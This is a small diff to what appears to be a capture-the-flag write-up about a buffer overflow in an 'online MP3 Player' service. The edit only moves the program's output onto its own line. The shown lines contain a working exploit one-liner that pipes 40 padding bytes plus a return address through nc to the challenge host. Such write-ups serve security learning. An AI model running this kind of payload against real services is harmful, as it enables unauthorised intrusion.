@@ -118,7 +118,8 @@ Program received signal SIGSEGV, Segmentation fault.
 There we managed to read my test flag. Now we have a payload to send:
 
 ```
-└─$ python -c 'print("A"*40 + "\x0f\x14\x40\x00\x00")' | nc motherload.td.org.uit.no 8006Welcome to my online MP3 Player!
+└─$ python -c 'print("A"*40 + "\x0f\x14\x40\x00\x00")' | nc motherload.td.org.uit.no 8006
+Welcome to my online MP3 Player!
 
 Please choose the name of the song you want to play:
 
